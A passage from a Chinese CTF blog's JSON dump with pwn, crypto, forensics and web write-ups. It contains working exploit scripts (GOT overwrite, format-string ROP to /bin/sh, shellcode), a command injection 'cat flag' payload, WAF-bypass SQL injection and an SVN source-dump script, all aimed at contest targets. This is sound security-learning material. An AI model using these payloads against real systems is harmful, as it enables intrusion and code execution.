printfupdate_slaves(0,\"a\"*0x18+p64(elf.got[\"atoi\"]))update_slaves(0,p64(elf.symbols[\"printf\"]))# leak libc and calc system_addrru(\"Exit\\n\")sd(\"%7$s....\"+p64(elf.got[\"printf\"]))printf_addr = u64(p.recv(6).ljust(8,\"\\x00\"))offset = 0x0000000000054b50 - 0x0000000000044380system_addr = printf_addr-offset# change atoi to systemru(\"Exit\\n\")sl(\"a\"*0x2)ru(\"id\\n\")sd(\"\\n\")ru(\"\\n\")sd(p64(system_addr))# exec /bin/shsd(\"/bin/sh\\x00\")p.interactive() 第三个漏洞第三个漏洞非常简单，字符串数组空间大小为0x20，然而却给它赋于了0x28的大小用户输入，导致其溢出覆盖了下一个指针，从而引发任意地址写的利用，我们可以利用任意地址写，将atoi改成printf来泄漏system地址，然后将atoi改成system实现任意代码执行,exp如下。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2017-08-17 09:43:44# @Author : WinterSun (511683586@qq.com)# @Link : https://Winter3un.github.io/import roputils,os,timefrom pwn import *from ctypes import *context(log_level=\"debug\")DEBUG = 1#socat TCP4-LISTEN:10001,fork EXEC:./pwn1target = \"./pwn\"remote_ip = \"\"port = 0rop = roputils.ROP(target)elf = ELF(target)# lib = cdll.LoadLibrary('./libc64.so')# payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)# libc = ELF[target]# msfvenom -p linux/x86/exec CMD=/bin/sh -b \"\\x0b\\x00\" -f python#buf = \"\"# buf += \"\\x2b\\xc9\\x83\\xe9\\xf5\\xe8\\xff\\xff\\xff\\xff\\xc0\\x5e\\x81\"# buf += \"\\x76\\x0e\\x7d\\x30\\x90\\xf9\\x83\\xee\\xfc\\xe2\\xf4\\x17\\x3b\"# buf += \"\\xc8\\x60\\x2f\\x56\\xf8\\xd4\\x1e\\xb9\\x77\\x91\\x52\\x43\\xf8\"# buf += \"\\xf9\\x15\\x1f\\xf2\\x90\\x13\\xb9\\x73\\xab\\x95\\x38\\x90\\xf9\"# buf += \"\\x7d\\x1f\\xf2\\x90\\x13\\x1f\\xe3\\x91\\x7d\\x67\\xc3\\x70\\x9c\"# buf += \"\\xfd\\x10\\xf9\"# int 0x80 linux x86 0x1c# buf = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\";# bss = rop.section('.bss')# rop.got('puts')# rop.call('read', 0, addr_bss, 0x100)# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\\x00\\x0b\\x0d\\x0a'# def exec_fmt(payload):# p = process(target)# p.recvuntil(\"input:\")# p.sendline(payload)# p.recvuntil(\"input:\")# p.sendline(payload)# return p.recvuntil(\",\")[:-1]# autofmt = FmtStr(exec_fmt)# offset = autofmt.offset# def send_payload(payload):# sl(payload+\"%100000c\")# autofmt = FmtStr(send_payload,offset=offset)# autofmt.write(free_hook_addr,one_gadget_addr)# autofmt.execute_writes()if DEBUG: p = process(target,env=&#123;\"LD_LIBRARY_PATH\":sys.path[0]&#125;) # gdb.attach(p,\"b*main\\nc\")else: p = remote(remote_ip,port)def sl(data): p.sendline(data)def sd(data): p.send(data)def ru(data): return p.recvuntil(data)ru(\"exit\\n\")sl(\"2\")# change atoi to printfru(\"Exit\\n\")sl(\"5\")ru(\"\\n\")sl(\"y\")ru(\"\\n\")payload = p64(elf.symbols[\"printf\"])+\"\\n\"payload = payload.ljust(0x20,\"\\x00\")payload +=p64(elf.got[\"atoi\"])sd(payload)ru(\"Exit\\n\")sl(\"%7$s....\"+p64(elf.got[\"printf\"]))printf_addr = u64(p.recv(6).ljust(8,\"\\x00\"))offset = 0x0000000000054b50 - 0x0000000000044380system_addr = printf_addr-offset# change atoi to systemru(\"Exit\\n\")sl(\"a\"*5)ru(\"y/n)\\n\")sl(\"y\")ru(\"nd up with '\\\\n')\\n\")payload = p64(system_addr)+\"\\n\"payload = payload.ljust(0x20,\"\\x00\")payload +=p64(elf.got[\"atoi\"])sd(payload)# \\nsl(\"/bin/sh\\x00\")p.interactive()","tags":[{"name":"pwn","slug":"pwn","permalink":"https://winter3un.github.io/tags/pwn/"},{"name":"web","slug":"web","permalink":"https://winter3un.github.io/tags/web/"},{"name":"awd","slug":"awd","permalink":"https://winter3un.github.io/tags/awd/"}]},{"title":"8月9日个人赛总结 && writeup","date":"2017-08-10T09:20:04.000Z","path":"2017/08/10/2017-8-9/","text":"前言还好这次比赛网络环境比较差，主办方被迫放了许多离线题，让我这只bin dog有机可乘（手动滑稽），但这次比赛也确实发现自身的web能力有限，对于一些简单的web题竟然出现无从下手的情况。。也借这次比赛总结下离线环境下一些特殊操作吧。 正文对于一些密码类的题目，手头有合适的工具最好了，但很多情况下，工具并不适用，比如这次比赛中，出现的aes解密，不清楚加密模式，需要输入iv和key，而手头的工具只可以输入key，且加密模式确定，没办法，只能去找库，不过比较幸运的是，之前安装过一个crypt的python库，看里面的源码，竟然有aes加密的说明，简单的倒推一下就能够推出解密脚本。 123456from Crypto.Cipher import AESkey = b'EaRncVfLgIPMaygA'iv = b'HDkMsMEzkkzyQLTH'cipher = AES.new(key, AES.MODE_CBC, iv)msg = iv + base64.b64decode(\"kWZnRZMZv9JJLcD4v6o19iFKHOhc/S1Dv5y3r2YxhnRuWE8w/ji0jr0VFAGDbfzyQLcONBtB6pjetkHggUPv/rUmXoSfTnnWJ/cfv9deT56KoxwtXMGO4LJyXakTPE2tMcu0UexsnlhfhlqUE2vGnNnNUm996thkRlp3v36OfwgVGfT22UVjv+lpk0lKXgT2liQm/eBRilEaPw4o6P29YV7zN3AqI2y5Sa+I13o53cwO9JNOCXC28wuYSBrbOauu61VGj9MroQ3Si5swvx4p8vzyZZd5SkjIJ69AFi6pGPxnptofigIS5NRvVYLady+n0IWDj32whAPinOHcB8t3qJH1YtwNf9ly7gFQUgqCEXXDuRTcercMxe72siNNtg1LZTVQJLViD4G1ROdrh9Lic2BTe/9mAt/mKeRIaXJDHrTTu/d6xao4P995xjhSAhkD+cgbuOCgwhkpVH6cyRR+aFKFBv6UVZzob4s7ul9Xjzc9ETBaoE8CoAXLSZ5zEGs0jEbL0Hf5SdenlISyny97BFnqiGXRQCwBIacq+ytw/VK6DC2ddHAOndZ5K/zmnE0WuccCDTQ8gskaswFpbSG4q47HaN8t/VNug4NfZSGE/kbf+rW7QGlwMF66ksxhpthlkXJkICbpgnHNwsAjZnDhN1t9SDms4EIbozHaopiH79gy+h3N8lk/85OJfM0rac5CGcFlO9Tgf0ov6cGe8ABTIw1tFKZIcXWqETIbl60WCgBxmJFsBbl0ikDDyTsxSn8cNK8bVymqmL5TuTM2clBhd/rV44nA5vCGAnEKzfEHoV3YFc4gik8/nUutDmxJdjeqrd7M0Lm0QKpVPl8ATA5Tf2PKTJ9CaxIiLyazY74D2egqYZzddjq4aXXNPWgwYk5OKAZz+avRMJWu+ACx0wlih0ScOor4PMbpRqSc8oEjmeg=\")cipher.decrypt(msg) 对于zip压缩包，还是archpr好用。。 对于web弱口令还需要准备一本字典，其实早就应该准备了，包括一些bypass waf的字典，网站扫描的字典，经过这次比赛，发现对于web题而言，字典是多么重要。 对于线下赛，webshellkill是一款好工具，可以直接利用其来找容易发现的一句话后门。（不过自己也需要写一个利用命令执行自动种马的脚本） rasctftools没有共模攻击的利用方式（这次比赛吃亏了！应该还有它没有的其他攻击方式） 线下赛的web waf需要完善。 新的pyc加密方式 stegosaurus writeup 如下 pwn打开文件。。发现又要压缩密码。。。ORZ linux/x86下一段汇编代码123456789xor %eax, %eaxxor %ebx, %ebxxor %ecx, %ecxpush %ecxpush $0x68732f2fpush $0x6e69622fmovl %esp,%ebxmovb $11,%alint $0x80 请将其提取为可用的shellcode,形式如\\x01\\x2d\\x……的代码(字母小写)，shellcode的小写MD5值为解压密码，上用pwntools的asm函数，将这些操作指令反汇编成机器码，如下 \\x31\\xc0\\x31\\xdb\\x31\\xc9\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80 然后再用题目提供的md5计算器计算下md5即可。 68f3e981152d37d372d732d0c3ee3977 接着常规套路，IDA打开分析一波，等等？？这pwn文件怎么那么熟悉= =。。 这不是全国大学生信安赛pwn3么，原题。。。虽然当时没做出来，但是后来看着别人的writeup复现了，exp还在本地，但是执行的时候，没有拿到shell，再看了下pwn文件，发现很多地址都有变动。 变动的数据 12345stack_povit = 0x00000000004b93f8pop_rdi_ret = 0x00000000004005d5fake_fsp = 0x06CCC10malloc_hook = 0x6CB788read_buf = 0x400AEE 具体的思路的话，还是利用格式化字符串的漏洞，修改malloc_hook的数据，让其在接受比较大的参数数据的时候执行malloc，比如”%100000c”,我们便可以控制执行流了。但是这边是静态编译，也不能狗利用one_gadget，很绝望，然而我们可以构造裸的rop来调用syscall（hhhhh），首先得找一个stack_povit，使我们的栈空间得到迁移，在这迁移的栈空间上构造我们的rop，然后触发ret，执行我们的rop，就拿到shell啦，下面是exp。。。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132#!/usr/bin/env python# -*- coding: utf-8 -*-# @Author : WinterSun (511683586@qq.com)# @Link : https://Winter3un.github.io/# import roputils,os,timefrom pwn import *from ctypes import *context(log_level=\"debug\")DEBUG = 0target = \"./pwn1\"remote_ip = \"172.16.2.10\"port = 20000# rop = roputils.ROP(target)# elf = ELF(target)# lib = cdll.LoadLibrary('./libc64.so')# payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)# libc = ELF[target]# msfvenom -p linux/x86/exec CMD=/bin/sh -b \"\\x0b\\x00\" -f python#buf = \"\"# buf += \"\\x2b\\xc9\\x83\\xe9\\xf5\\xe8\\xff\\xff\\xff\\xff\\xc0\\x5e\\x81\"# buf += \"\\x76\\x0e\\x7d\\x30\\x90\\xf9\\x83\\xee\\xfc\\xe2\\xf4\\x17\\x3b\"# buf += \"\\xc8\\x60\\x2f\\x56\\xf8\\xd4\\x1e\\xb9\\x77\\x91\\x52\\x43\\xf8\"# buf += \"\\xf9\\x15\\x1f\\xf2\\x90\\x13\\xb9\\x73\\xab\\x95\\x38\\x90\\xf9\"# buf += \"\\x7d\\x1f\\xf2\\x90\\x13\\x1f\\xe3\\x91\\x7d\\x67\\xc3\\x70\\x9c\"# buf += \"\\xfd\\x10\\xf9\"# int 0x80 linux x86 0x1c# buf = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\";# bss = rop.section('.bss')# rop.got('puts')# rop.call('read', 0, addr_bss, 0x100)# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\\x00\\x0b\\x0d\\x0a'# def exec_fmt(payload):# p = process(target)# p.recvuntil(\"input:\")# p.sendline(payload)# p.recvuntil(\"input:\")# p.sendline(payload)# return p.recvuntil(\",\")[:-1]# autofmt = FmtStr(exec_fmt)# offset = autofmt.offset# def send_payload(payload):# sl(payload+\"%100000c\")# autofmt = FmtStr(send_payload,offset=offset)# autofmt.write(free_hook_addr,one_gadget_addr)# autofmt.execute_writes()if DEBUG: p = process(target,env=&#123;\"LD_LIBRARY_PATH\":sys.path[0]&#125;) # gdb.attach(p,\"b*0x400B69\\nc\")else: p = remote(remote_ip,port)def sl(data): p.sendline(data)def sd(data): p.send(data)def ru(data): return p.recvuntil(data)stack_povit = 0x00000000004b93f8pop_rdi_ret = 0x00000000004005d5fake_fsp = 0x06CCC10malloc_hook = 0x6CB788read_buf = 0x400AEE# payload = 'A'*8+\"%6$n\\0\"l = []l.append((stack_povit ) &amp;0xffff)l.append((stack_povit &gt;&gt; 0x10) &amp;0xffff)l.append((pop_rdi_ret) &amp;0xffff)l.append((pop_rdi_ret &gt;&gt; 0x10) &amp;0xffff)l.append((fake_fsp) &amp; 0xffff)l.append((fake_fsp &gt;&gt; 0x10) &amp;0xffff)l.append((read_buf) &amp; 0xffff)l.append((read_buf &gt;&gt; 0x10) &amp; 0xffff)payload = \"\"delta = 0printed = 0index = 6 + 14 # target addrfor data in l: delta = (data-printed)&amp;0xffff payload += '%'+str(delta)+'c'+'%'+str(index)+'$hn' printed += delta index += 1# payload+=(len(payload)%8)*'A'payload +=\"%\"+str(fake_fsp-0x20)+\"s\"payload = payload.ljust(14*8,'a')# target addrpayload += p64(malloc_hook)payload += p64(malloc_hook+2)payload += p64(fake_fsp)payload += p64(fake_fsp+2)payload += p64(fake_fsp+8)payload += p64(fake_fsp+0xa)payload += p64(fake_fsp+0x10)payload += p64(fake_fsp+0x12)sl(payload)pop_rdi_ret = 0x00000000004005d5pop_rdx_rsi_ret = 0x0000000000442a99pop_rax_rdx_rbx_ret = 0x0000000000479836syscall = 0x4004cerop = \"aaaa\\x17\"rop += p64(pop_rdi_ret)+p64(fake_fsp+0x50+0x18)rop += p64(pop_rdx_rsi_ret)+p64(0)+p64(0)rop += p64(pop_rax_rdx_rbx_ret)+p64(0x3b)+p64(0)+p64(0)rop += p64(syscall)rop += \"/bin/sh\\x00\"rop += \"/bin/sh\\x00\"sl(rop)# payload = \"%6$hn\"p.interactive()# flag&#123;9d3db853efce91066f22f1bc09aea6&#125; XOR看了加密脚本。。可以直接写出解密脚本，流程基本上没有变化。 123456789101112131415from struct import pack, unpackfrom base64 import b64encodefrom base64 import b64decodefrom random import randintwith open('flag.enc', 'r') as f: s = f.read()p = b64decode(s)blocks = unpack('I' * (len(p) / 4), p)result = [block ^ block &gt;&gt; 16 for block in blocks]ciphertext = (''.join(pack('I',block) for block in result))print ciphertext[::-1] moudle其实题目名字已经提示了很多了，但是。。我在赛场上竟然蠢的只看了其中一个公钥文件0 0，然后GG。常规思路，用rsatools跑了一下，发现没有任何信息，赛后得知其实RSA共模攻击，0 0蠢的想扇死自己。。。 findme比较良心，没去掉后缀名，用winhex转换磁盘镜像获得磁盘回收站内的zip文件，然后需要解密ORZ，以为是伪加密，但是不存在的，010打开，发现zip文件末尾存在额外数据，尝试用gbk解码，发现提示。用工具很快就能爆破出密码。stegslove打开，在其额外数据段发现其内存在flag= = pyc使用GitTools恢复出了四个历史文件夹，其中两个里面发现了存在数据，一个是pyc文件，还有一个压缩包，不知道干嘛的，010打开pyc文件，发现有密码，一开始没有在意，用常规思路，去逆向pyc，发现不存在的，后来试着用刚刚发现的密码去解压压缩文件，发现有现成的攻击可以跑。。。ORZ跑出来就是flag pcap用NetworkMiner提取数据，发现存在几个图片文件和一个密文，提示是aes，尝试用aes去破解，获得png数据，生成图片后，扫码获得flag 12345key = b'EaRncVfLgIPMaygA'iv = b'HDkMsMEzkkzyQLTH'cipher = AES.new(key, AES.MODE_ECB, iv)msg = iv + base64.b64decode(\"kWZnRZMZv9JJLcD4v6o19iFKHOhc/S1Dv5y3r2YxhnRuWE8w/ji0jr0VFAGDbfzyQLcONBtB6pjetkHggUPv/rUmXoSfTnnWJ/cfv9deT56KoxwtXMGO4LJyXakTPE2tMcu0UexsnlhfhlqUE2vGnNnNUm996thkRlp3v36OfwgVGfT22UVjv+lpk0lKXgT2liQm/eBRilEaPw4o6P29YV7zN3AqI2y5Sa+I13o53cwO9JNOCXC28wuYSBrbOauu61VGj9MroQ3Si5swvx4p8vzyZZd5SkjIJ69AFi6pGPxnptofigIS5NRvVYLady+n0IWDj32whAPinOHcB8t3qJH1YtwNf9ly7gFQUgqCEXXDuRTcercMxe72siNNtg1LZTVQJLViD4G1ROdrh9Lic2BTe/9mAt/mKeRIaXJDHrTTu/d6xao4P995xjhSAhkD+cgbuOCgwhkpVH6cyRR+aFKFBv6UVZzob4s7ul9Xjzc9ETBaoE8CoAXLSZ5zEGs0jEbL0Hf5SdenlISyny97BFnqiGXRQCwBIacq+ytw/VK6DC2ddHAOndZ5K/zmnE0WuccCDTQ8gskaswFpbSG4q47HaN8t/VNug4NfZSGE/kbf+rW7QGlwMF66ksxhpthlkXJkICbpgnHNwsAjZnDhN1t9SDms4EIbozHaopiH79gy+h3N8lk/85OJfM0rac5CGcFlO9Tgf0ov6cGe8ABTIw1tFKZIcXWqETIbl60WCgBxmJFsBbl0ikDDyTsxSn8cNK8bVymqmL5TuTM2clBhd/rV44nA5vCGAnEKzfEHoV3YFc4gik8/nUutDmxJdjeqrd7M0Lm0QKpVPl8ATA5Tf2PKTJ9CaxIiLyazY74D2egqYZzddjq4aXXNPWgwYk5OKAZz+avRMJWu+ACx0wlih0ScOor4PMbpRqSc8oEjmeg=\")cipher.decrypt(msg) wordpress按照提示做出来的，本来可以用find命令查最近修改文件的日期来获取信息，但是命令忘了，又不能够连接网络ORZ。。。提示是存在后门。grep一下eval(找到后门文件，接下来常规思路。(赛后得知可以用killshell来快速查找后门的，找后门的还有几个工具，有时间得拿出来比较实验以下~web弱渣了ORZ) Replace解压缩包密码的过程就不说了吧，很无聊 直接upx解壳，1234567891011121314a = [0x63,0x7C,0x77,0x7B,0x0F2,0x6B,0x6F,0x0C5,0x30,0x1,0x67,0x2B,0x0FE,0x0D7,0x0AB,0x76,0x0CA,0x82,0x0C9,0x7D,0x0FA,0x59,0x47,0x0F0,0x0AD,0x0D4,0x0A2,0x0AF,0x9C,0x0A4,0x72,0x0C0,0x0B7,0x0FD,0x93,0x26,0x36,0x3F,0x0F7,0x0CC,0x34,0x0A5,0x0E5,0x0F1,0x71,0x0D8,0x31,0x15,0x4,0x0C7,0x23,0x0C3,0x18,0x96,0x5,0x9A,0x7,0x12,0x80,0x0E2,0x0EB,0x27,0x0B2,0x75,0x9,0x83,0x2C,0x1A,0x1B,0x6E,0x5A,0x0A0,0x52,0x3B,0x0D6,0x0B3,0x29,0x0E3,0x2F,0x84,0x53,0x0D1,0x0,0x0ED,0x20,0x0FC,0x0B1,0x5B,0x6A,0x0CB,0x0BE,0x39,0x4A,0x4C,0x58,0x0CF,0x0D0,0x0EF,0x0AA,0x0FB,0x43,0x4D,0x33,0x85,0x45,0x0F9,0x2,0x7F,0x50,0x3C,0x9F,0x0A8,0x51,0x0A3,0x40,0x8F,0x92,0x9D,0x38,0x0F5,0x0BC,0x0B6,0x0DA,0x21,0x10,0x0FF,0x0F3,0x0D2,0x0CD,0x0C,0x13,0x0EC,0x5F,0x97,0x44,0x17,0x0C4,0x0A7,0x7E,0x3D,0x64,0x5D,0x19,0x73,0x60,0x81,0x4F,0x0DC,0x22,0x2A,0x90,0x88,0x46,0x0EE,0x0B8,0x14,0x0DE,0x5E,0x0B,0x0DB,0x0E0,0x32,0x3A,0x0A,0x49,0x6,0x24,0x5C,0x0C2,0x0D3,0x0AC,0x62,0x91,0x95,0x0E4,0x79,0x0E7,0x0C8,0x37,0x6D,0x8D,0x0D5,0x4E,0x0A9,0x6C,0x56,0x0F4,0x0EA,0x65,0x7A,0x0AE,0x8,0x0BA,0x78,0x25,0x2E,0x1C,0x0A6,0x0B4,0x0C6,0x0E8,0x0DD,0x74,0x1F,0x4B,0x0BD,0x8B,0x8A,0x70,0x3E,0x0B5,0x66,0x48,0x3,0x0F6,0x0E,0x61,0x35,0x57,0x0B9,0x86,0x0C1,0x1D,0x9E,0x0E1,0x0F8,0x98,0x11,0x69,0x0D9,0x8E,0x94,0x9B,0x1E,0x87,0x0E9,0x0CE,0x55,0x28,0x0DF,0x8C,0x0A1,0x89,0x0D,0x0BF,0x0E6,0x42,0x68,0x41,0x99,0x2D,0x0F,0x0B0,0x54,0x0BB,0x16]b = \"bb3ccfb0213965aed24b9264ae4bbb92543954bb0739bbbbcf64f554cff5f365f565f386\".decode(\"hex\")flag = \"\"for x in b: d = ord(x) ^ 0x88 for y in range(0x0,0xff): # print (y &amp;0xf)+(y &gt;&gt; 4)*2 if a[(y &gt;&gt; 4)+8*((y &amp;0xf)*2)] == d: flag += chr(y) breakprint flag# flag&#123;e52d34823f49e9f7effa819a105150&#125; 送分题web弱渣就算碰到送分题也不会啊，通过提示和提供的密码本，原来考察点是在于弱口令ORZ （好吧，服了，一直拿sql在注，返回速度还特别慢），用burp加载top 10 password（原来还有这种东西），爆破登录界面得到flag。 code秒做的题目, payload 127.0.0.1;cat flag 命令执行绕过有很多姿势，但遗憾的是这边没有过滤。 wafwaf这题题目其实一开始也不会的，也是通过提示来过的，黑盒测试发现waf拦截许多东西，最为关键的就是 union select，所以想办法绕过，经过N次测试，发现/*!50000select*/ 不会被waf拦截，于是构造%27/*!50000union*/%0a/*!50000select*/%0aflag%0a/*!50000from*/flag%23 得到flag blog好像是叫这个名字？忘了，赛后听说是admin，密码是123456，然后进去一系列骚操作获取flag，又是考弱口令啊啊啊啊啊啊 markdown也是赛后得知的，考察通过markdown的ssrf来获取信息，语法是![](flag.php)，flag的文件名需要通过robots.txt文件来获取，构造即可从源码中获得到flag信息。 box也是赛后得知的，听说是全国大学生信安赛的wanna to see your hat ,（蜜汁微笑，技术支持真懒）。不过作为biner，当时比赛的时候，没去碰这题题目，没做出来，认了。。。。赛后复现如下。 拿weakfilescan扫描以下敏感文件，发现存在svn泄漏。 12345678910111213141516171819202122--------------------------------------------------* scan http://123.59.52.228:1515 start--------------------------------------------------[200] http://123.59.52.228:1515 =&gt; http://123.59.52.228:1515/route.php?act=index[200] http://123.59.52.228:1515/.svn/entries =&gt; http://123.59.52.228:1515/.svn/entries--------------------------------------------------* scan complete...--------------------------------------------------&#123; &quot;dirs&quot;: &#123; &quot;http://123.59.52.228:1515&quot;: [ &quot;http://123.59.52.228:1515/&quot; ] &#125;, &quot;files&quot;: &#123; &quot;http://123.59.52.228:1515&quot;: &#123; &quot;/.svn/&quot;: [ &quot;http://123.59.52.228:1515/.svn/entries&quot; ] &#125; &#125;&#125; 使用svn.py将源码dump下来。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#!/usr/bin/env python #coding:utf-8__author__ = 'Rivir'import requestsimport osimport sys print ''' ---- _____ ______ __ / ___/ ______ /_ __/___ ____ / /____ \\__ \\ | / / __ \\ / / / __ \\/ __ \\/ / ___/ ___/ / |/ / / / / / / / /_/ / /_/ / (__ ) /____/|___/_/ /_/ /_/ \\____/\\____/_/____/ author: Rivir ----\\ . . \\ / `. .' \" \\ .---. &lt; &gt; &lt; &gt; .---. \\ | \\ \\ - ~ ~ - / / | _____ ..-~ ~-..-~ | | \\~~~\\.' `./~~~/ --------- \\__/ \\__/ .' O \\ / / \\ \" (_____, `._.' | &#125; \\/~~~/ `----. / &#125; | / \\__/ `-. | / | / `. ,~~| ~-.__| /_ - ~ ^| /- _ `..-' | / | / ~-. `-. _ _ _ |_____| |_____| ~ - . _ _ _ _ _&gt; ''' headers = &#123;'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'&#125; def getfilename(url): with open('wc.db','wb') as f: content = requests.get(url=url+'/.svn/wc.db',headers=headers).content f.write(content) with open('svn.txt','w') as file: info = os.popen(\"\"\"sqlite3 wc.db 'select local_relpath, \".svn/pristine/\" || substr(checksum,7,2) || \"/\" || substr(checksum,7) || \".svn-base\" as alpha from NODES;'\"\"\").read() #print info file.write(info) os.remove('wc.db') def restore_svn(url): getfilename(url) if not os.path.exists('./svn'): os.mkdir('svn') with open('svn.txt') as f: for file in f: tmp = file.strip().split('|') #print tmp if len(tmp) == 1: continue name = tmp[0] path = tmp[1] if '/' in name: book = os.path.dirname(name) if not os.path.exists('./svn/'+book): os.makedirs('./svn/'+book) print 'download:','./svn/'+name try: with open('./svn/'+name,'w') as f: req = requests.get(url+path,headers=headers) f.write(req.content) except Exception,e: #print e pass if __name__ == '__main__': restore_svn(sys.argv[-1]) 发现flag.php文件，然而并没有什么软用。发现index.php中，如果$_SESSION[&quot;hat&quot;] == &quot;black&quot; 会输出flag，所以我们希望找到一个地方，这个地方是给$_SESSION[&quot;hat&quot;]赋予&quot;black&quot;字符串的，我们在login.php中找到了。 12345678910 $sql = \"select count(*) from t_info where username = '$name' or nickname = '$name'\"; echo $sql; $result = mysql_query($sql); $row = mysql_fetch_array($result); if ($row[0])&#123; $_SESSION['hat'] = 'black'; echo 'good job'; &#125;else&#123;$_SESSION['hat'] = 'green'; &#125; 这边有个坑，reg那个页面中所用的表和login页面中登录的表不一样。。所以无论怎么注册都没用，需要选手绕过waf来注入。。。 waf规则 123456789$name = str_replace(\"'\", \"\", trim(waf($_POST[\"name\"])));function waf($value)&#123; $Filt = \"\\bUNION.+SELECT\\b|SELECT.+?FROM\"; if (preg_match(\"/\".$Filt.\"/is\",$value)==1)&#123; die(\"found a hacker\"); &#125; $value = str_replace(\" \",\"\",$value); return $value;&#125; $_POST首先会被全局转义，故而会多出个反斜杠，这边waf替换掉了单引号，但是没有替换掉反斜杠，导致反斜杠的特殊利用。 select count(*) from t_info where username = &#39;||1#\\&#39; or nickname = &#39;||1#\\&#39; 转到index页面获取flag login???这waf太强啦，真不会啊~ 跪求大佬的wp 后记此次比赛网络环境确实不是很好，所以对于做离线题目的选手要有利的多，离线的环境。做web题的时候，用weakfilescan来发现敏感文件，发现这玩意不支持302，真坑啊。","tags":[{"name":"writeup","slug":"writeup","permalink":"https://winter3un.github.io/tags/writeup/"}]},{"title":"【web】jarvis oj 刷题","date":"2017-06-17T14:13:07.000Z","path":"2017/06/17/jarvisoj-web/","text":"web？1234567891011import npo = [[11, 13, 32, 234, 236, 3, 72, 237, 122, 230, 157, 53, 7, 225, 193, 76, 142, 166, 11, 196, 194, 187, 152, 132, 135], [76, 55, 38, 70, 98, 244, 201, 125, 182, 123, 47, 86, 67, 19, 145, 12, 138, 149, 83, 178, 255, 122, 238, 187, 221], [218, 233, 17, 56, 151, 28, 150, 196, 79, 11, 150, 128, 52, 228, 189, 107, 219, 87, 90, 221, 45, 201, 14, 106, 230], [30, 50, 76, 94, 172, 61, 229, 109, 216, 12, 181, 231, 174, 236, 159, 128, 245, 52, 43, 11, 207, 145, 241, 196, 80], [134, 145, 36, 255, 13, 239, 212, 135, 85, 194, 200, 50, 170, 78, 51, 10, 232, 132, 60, 122, 117, 74, 117, 250, 45], [142, 221, 121, 56, 56, 120, 113, 143, 77, 190, 195, 133, 236, 111, 144, 65, 172, 74, 160, 1, 143, 242, 96, 70, 107], [229, 79, 167, 88, 165, 38, 108, 27, 75, 240, 116, 178, 165, 206, 156, 193, 86, 57, 148, 187, 161, 55, 134, 24, 249], [235, 175, 235, 169, 73, 125, 114, 6, 142, 162, 228, 157, 160, 66, 28, 167, 63, 41, 182, 55, 189, 56, 102, 31, 158], [37, 190, 169, 116, 172, 66, 9, 229, 188, 63, 138, 111, 245, 133, 22, 87, 25, 26, 106, 82, 211, 252, 57, 66, 98], [199, 48, 58, 221, 162, 57, 111, 70, 227, 126, 43, 143, 225, 85, 224, 141, 232, 141, 5, 233, 69, 70, 204, 155, 141], [212, 83, 219, 55, 132, 5, 153, 11, 0, 89, 134, 201, 255, 101, 22, 98, 215, 139, 0, 78, 165, 0, 126, 48, 119], [194, 156, 10, 212, 237, 112, 17, 158, 225, 227, 152, 121, 56, 10, 238, 74, 76, 66, 80, 31, 73, 10, 180, 45, 94], [110, 231, 82, 180, 109, 209, 239, 163, 30, 160, 60, 190, 97, 256, 141, 199, 3, 30, 235, 73, 225, 244, 141, 123, 208], [220, 248, 136, 245, 123, 82, 120, 65, 68, 136, 151, 173, 104, 107, 172, 148, 54, 218, 42, 233, 57, 115, 5, 50, 196], [190, 34, 140, 52, 160, 34, 201, 48, 214, 33, 219, 183, 224, 237, 157, 245, 1, 134, 13, 99, 212, 230, 243, 236, 40], [144, 246, 73, 161, 134, 112, 146, 212, 121, 43, 41, 174, 146, 78, 235, 202, 200, 90, 254, 216, 113, 25, 114, 232, 123], [158, 85, 116, 97, 145, 21, 105, 2, 256, 69, 21, 152, 155, 88, 11, 232, 146, 238, 170, 123, 135, 150, 161, 249, 236], [251, 96, 103, 188, 188, 8, 33, 39, 237, 63, 230, 128, 166, 130, 141, 112, 254, 234, 113, 250, 1, 89, 0, 135, 119], [192, 206, 73, 92, 174, 130, 164, 95, 21, 153, 82, 254, 20, 133, 56, 7, 163, 48, 7, 206, 51, 204, 136, 180, 196], [106, 63, 252, 202, 153, 6, 193, 146, 88, 118, 78, 58, 214, 168, 68, 128, 68, 35, 245, 144, 102, 20, 194, 207, 66], [154, 98, 219, 2, 13, 65, 131, 185, 27, 162, 214, 63, 238, 248, 38, 129, 170, 180, 181, 96, 165, 78, 121, 55, 214], [193, 94, 107, 45, 83, 56, 2, 41, 58, 169, 120, 58, 105, 178, 58, 217, 18, 93, 212, 74, 18, 217, 219, 89, 212], [164, 228, 5, 133, 175, 164, 37, 176, 94, 232, 82, 0, 47, 212, 107, 111, 97, 153, 119, 85, 147, 256, 130, 248, 235], [221, 178, 50, 49, 39, 215, 200, 188, 105, 101, 172, 133, 28, 88, 83, 32, 45, 13, 215, 204, 141, 226, 118, 233, 156], [236, 142, 87, 152, 97, 134, 54, 239, 49, 220, 233, 216, 13, 143, 145, 112, 217, 194, 114, 221, 150, 51, 136, 31, 198]]r = [325799, 309234, 317320, 327895, 298316, 301249, 330242, 289290, 273446, 337687, 258725, 267444, 373557, 322237, 344478, 362136, 331815, 315157, 299242, 305418, 313569, 269307, 338319, 306491, 351259]o = np.array(o)r = np.array(r)x = 